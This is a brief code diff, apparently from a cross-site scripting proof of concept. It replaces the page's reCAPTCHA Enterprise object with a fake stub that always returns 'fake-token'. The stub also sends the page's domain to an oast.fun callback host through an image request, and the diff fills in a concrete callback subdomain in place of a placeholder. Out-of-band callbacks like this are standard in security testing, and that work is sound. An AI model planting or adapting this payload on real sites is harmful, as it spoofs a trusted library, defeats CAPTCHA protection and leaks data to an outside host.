@@ -3,7 +3,7 @@ window.grecaptcha = {
   enterprise: {
     ready: (cb) => cb(),
     execute: (key, opt) => {
-      new Image().src = "https://<your-oast>.oast.fun/xss?d=" + document.domain;
+      new Image().src = "https://wdnjvosjkyhkfsmxvovxoq4wsvswtm3id.oast.fun/xss?d=" + document.domain;
       return Promise.resolve("fake-token");
     }
   }
